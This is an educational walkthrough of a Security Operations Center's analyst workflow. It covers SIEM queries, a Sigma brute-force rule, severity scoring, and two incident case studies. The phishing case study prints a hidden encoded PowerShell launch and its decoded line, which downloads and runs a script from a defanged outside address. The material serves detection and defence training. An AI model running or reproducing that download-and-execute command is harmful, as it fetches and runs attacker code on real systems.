Alert to resolution: how a SOC actually works

A deep walkthrough of the Security Operations Center analyst workflow — from raw log to detection rule to triaged, investigated, closed incident. Includes two full case studies, a detection-engineering pipeline, a severity scoring model, and a working alert-triage simulation.

1 · What a SOC does

A Security Operations Center is the team and system that watches an organization's environment continuously and responds when something looks wrong.

TIER 1

Triage analyst

First responder to alerts. Confirms whether an alert is a true or false positive, gathers initial context, and either closes it or escalates.

TIER 2

Incident responder

Takes escalated alerts, performs deeper investigation across logs and endpoints, decides on containment actions.

TIER 3

Threat hunter / lead

Proactively searches for threats that didn't trigger an alert, tunes detection rules, and handles the most complex incidents.

Alerts don't arrive already labeled "attack" — the whole discipline is about turning ambiguous signals (a failed login, an unusual outbound connection, a new scheduled task) into a confident verdict, fast enough that damage is contained before it spreads.

A shift, structurally

Analysts work rotating shifts because attacks don't respect business hours — most SOCs run 24/7 either with follow-the-sun coverage across time zones or with on-call escalation overnight. A single Tier 1 analyst typically has 15–40 alerts open across a shift, which is precisely why triage speed and false-positive tuning (§4) matter as much as investigative skill.

escalation & response time expectations by severity

These are called SLAs (service level agreements) — a SOC's credibility, internally and to clients, rests on hitting them consistently, which is why MTTD and MTTR (§12) get tracked so closely.

What analysts actually type

Tool names alone don't demonstrate skill — the actual query language does. Here's the same investigative question ("show me failed then successful logins from the same source") in two SIEM query languages:

// Splunk SPL
index=auth sourcetype=sshd
| transaction src_ip maxspan=10m
| search Failed_password>10 Accepted_password>=1
| table _time src_ip user Failed_password Accepted_password

// Microsoft Sentinel / KQL
SigninLogs
| where ResultType != "0"
| summarize FailCount = count() by IPAddress, bin(TimeGenerated, 5m)
| where FailCount > 10
| join kind=inner (SigninLogs | where ResultType == "0") on IPAddress

And a detection rule written in Sigma — a vendor-neutral format that converts into Splunk, Sentinel, or Elastic syntax automatically, which is why detection engineers write rules in it once and deploy everywhere:

title: Brute Force Followed By Successful Login
logsource:
  product: linux
  service: sshd
detection:
  failed:
    EventID: 'Failed password'
  success:
    EventID: 'Accepted password'
  timeframe: 5m
  condition: failed | count() by src_ip > 10 and success
level: high

3 · Detection engineering pipeline

Before any alert can fire, someone has to build the rule that fires it. This is the pipeline behind every box in Fig. 1.

Fig. 2 — This is the loop that produced the Sigma rule in §2. A rule ships, generates alerts, and if Tier 1 keeps closing them as false positives, the rule comes back for tuning rather than staying noisy forever.

Two failure modes dominate this pipeline. A rule that's too broad ("alert on any failed login") drowns Tier 1 in noise and trains analysts to dismiss it — this is alert fatigue, and it's the single biggest cause of missed real incidents in immature SOCs. A rule that's too narrow ("alert only on exactly 40 failed logins from this exact source") misses the attacker who tries 39 or rotates IPs. Good detection engineering iterates constantly between these, driven directly by Tier 1's false-positive feedback from §7.

4 · Alert severity scoring model

Severity in the queue below (and in Fig. 4) isn't a guess — most SOCs compute it from a small set of factors.

severity score = asset criticality × threat confidence × potential impact
example scoring inputs
FactorLow (1)Medium (2)High (3)
Asset criticalityEmployee laptopInternal app serverDomain controller / prod database
Threat confidenceHeuristic match onlyMatches known TTP patternConfirmed IOC match (known-bad hash/IP)
Potential impactReconnaissance onlyUnauthorized access attemptedData exfiltration or system compromise confirmed

A score of 3×3×3 = 27 is treated as critical; 1×1×1 = 1 barely registers. This is why the same technical event — a failed login — can be "low" on a junior developer's laptop and "critical" on a domain controller: the formula is asset-aware, not just signature-aware.

7 · Case study 1 — brute-force SSH login

A worked example of an alert going through the full lifecycle above, with sample log evidence at each step.

Alert: "Excessive authentication failures — host 10.0.4.22" high

STEP 1 — DETECTION

SIEM correlation rule (the Sigma rule from §2) fires after 40 failed SSH logins from a single source IP within 5 minutes.

Jan 14 02:11:03 host sshd[2291]: Failed password for root from 185.220.101.7 port 51322 ssh2
Jan 14 02:11:04 host sshd[2293]: Failed password for root from 185.220.101.7 port 51330 ssh2
Jan 14 02:11:05 host sshd[2295]: Failed password for admin from 185.220.101.7 port 51338 ssh2
... 37 more attempts across 4 minutes ...
STEP 2 — ANALYSIS

Analyst checks the source IP against threat intel (flagged as a known Tor exit node), confirms the targeted account (root) has no legitimate remote-login use case, and checks whether any attempt succeeded.

Jan 14 02:15:41 host sshd[2340]: Accepted password for admin from 185.220.101.7 port 51402 ssh2

One attempt succeeded — this is no longer a suspicious pattern, it's a confirmed compromise. Using §4's scoring: asset criticality (production database host) = 3, threat confidence (confirmed successful login from known-bad IP) = 3, potential impact (unauthorized access confirmed, exfiltration not yet confirmed) = 2 → score 18, raised from high to critical.

STEP 3 — CONTAINMENT

Analyst blocks the source IP at the firewall, forces a password reset on the admin account, and disables it temporarily while the session is reviewed.

# firewall block, applied via SOAR playbook automatically
iptables -A INPUT -s 185.220.101.7 -j DROP

# check what the compromised session actually did
last admin | head -5
history -r /home/admin/.bash_history
STEP 4 — ERADICATION & RECOVERY

Reviews the compromised account's session history for any changes made (new users created, cron jobs added, files modified), removes anything malicious found, re-enables the account with a new password and MFA required.

STEP 5 — LESSONS LEARNED

Root cause: SSH was reachable from the public internet with password auth enabled. Recommendation: restrict SSH to a VPN-only source, disable password auth in favor of key-based auth, add a lockout rule after 5 failed attempts instead of 40 — this last point is fed back into the detection pipeline (§3) as a rule-tuning ticket.

8 · Case study 2 — phishing email to malware execution

A second, different-shaped incident: this one starts with a user action rather than a network scan, and resolves at the endpoint rather than the firewall.

Alert: "Suspicious child process spawned by Office application" critical

STEP 1 — DETECTION

EDR flags WINWORD.EXE spawning powershell.exe with an encoded command — a classic macro-based execution chain, and one of the highest-fidelity detections in endpoint security because Word almost never legitimately launches PowerShell.

[EDR] ProcessCreate
  Parent: WINWORD.EXE (PID 4021)
  Child:  powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...
  User:   CORP\l.martins
  Host:   FIN-WKS-014
  Time:   2026-09-11 08:47:12
STEP 2 — ANALYSIS

Analyst decodes the Base64 PowerShell command and finds it downloads a second-stage payload from an external URL. Email logs are checked for the originating message.

# decoded command
IEX (New-Object Net.WebClient).DownloadString('hxxp://185.199.108[.]153/update.ps1')

# mail gateway log — the delivery vector
From: billing@vendor-invoices-secure[.]com
Subject: Invoice #88213 - Payment Overdue
Attachment: Invoice_88213.docm (macro-enabled)
Delivered: 08:44:03, opened by user: 08:46:55

Scoring via §4: asset criticality (single finance workstation) = 2, threat confidence (confirmed malicious macro + live C2 URL) = 3, potential impact (active payload download in progress) = 3 → score 18, critical.

STEP 3 — CONTAINMENT

EDR isolates the host from the network (keeps it powered on for forensics but blocks all traffic except to the EDR console). The malicious sender domain and the C2 IP are blocked at the email gateway and firewall. Analyst searches the SIEM for the same attachment hash across all mailboxes — three other employees received it but none had opened it yet, so those emails are purged before anyone clicks.

# SIEM search: has anyone else received or run this?
index=email sha256="a94b2...c71f" 
| stats count by recipient, opened

index=edr process_hash="a94b2...c71f"
| stats count by host
STEP 4 — ERADICATION & RECOVERY

Full malware scan and reimage of the affected workstation rather than attempted cleanup — standard practice once a live C2 connection is confirmed, since partial remediation risks leaving a backdoor. User's credentials are rotated in case they were harvested by the second-stage payload before isolation occurred.

STEP 5 — LESSONS LEARNED

Root cause: macro execution was enabled by default and the sender domain was newly registered (a week old) but wasn't yet on any blocklist. Recommendations: disable macros from internet-sourced documents org-wide via group policy, add a mail-gateway rule flagging domains registered in the last 30 days, and add this campaign's indicators to the threat intel feed so the next attempt is blocked automatically at Step 1.

11 · KPIs a SOC tracks

What "good" looks like, measured — the numbers you'd cite in a resume or a stand-up.

MTTD
Mean Time To Detect — how long a threat sits unnoticed
MTTR
Mean Time To Respond — detection to containment
FP Rate
False positive rate — alert quality and tuning health
Dwell Time
How long an attacker had access before eviction
Alert Volume
Alerts per analyst per shift — a proxy for burnout risk
Coverage
% of MITRE ATT&CK techniques with a detection rule

12 · Where SOC work is heading

GROWING FAST

AI-assisted triage

Machine learning pre-scores and summarizes alerts before a human ever opens them, cutting the volume analysts sift through manually.

MATURING

SOAR automation

Routine response steps — blocking an IP, disabling an account, opening a ticket — run automatically, leaving analysts for judgment calls.

GROWING

XDR (Extended Detection & Response)

Unifies endpoint, network, and cloud detection into one correlated view instead of separate tools an analyst has to pivot between.

EARLY

Autonomous threat hunting agents

AI agents that proactively query logs for anomalies between shifts, surfacing hypotheses for a human to validate rather than waiting for a rule to fire.

13 · Quick glossary

True/False positive
An alert that correctly (or incorrectly) identified malicious activity.
IOC
Indicator of Compromise — an artifact (IP, hash, domain) associated with known malicious activity.
TTP
Tactics, Techniques and Procedures — the behavioral fingerprint of how an attacker operates, more durable than any single IOC.
Playbook
A predefined, often automated, sequence of response steps for a specific alert type.
Dwell time
The time between an attacker's initial access and their detection or eviction.
Escalation
Handing an alert from a lower tier to a more senior analyst or team.
Threat intel
Curated data about known-malicious IPs, domains, and file hashes, used to enrich alerts.
Alert fatigue
The desensitization that happens when analysts face too many low-value alerts, raising the risk of missing a real one.
C2 (command and control)
The infrastructure an attacker uses to remotely control compromised systems after initial access.
Sigma rule
A vendor-neutral, YAML-based detection rule format that converts into native SIEM query syntax.
